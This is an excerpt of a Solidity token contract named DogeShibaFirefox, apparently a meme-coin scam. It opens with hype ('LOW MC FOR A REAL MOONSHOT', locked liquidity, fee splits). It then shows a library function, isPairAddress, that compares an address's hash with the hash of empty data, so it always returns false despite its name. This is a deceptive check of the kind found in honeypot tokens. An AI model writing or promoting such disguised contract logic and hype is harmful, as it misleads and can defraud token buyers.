...
POOCOIN ADDS RUNNING(biggest spot)

🚀 LOW MC FOR A REAL MOONSHOT
🔒 Liquidity locked 
🔥4% Marketing 
🔥2% Liquidity 
🔥30% Burn
...
library Address {
    ...
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    }
}
...
contract DogeShibaFirefox is Ownable, IERC20 {
    ...
    string private _name = "DogeShibaFirefox";
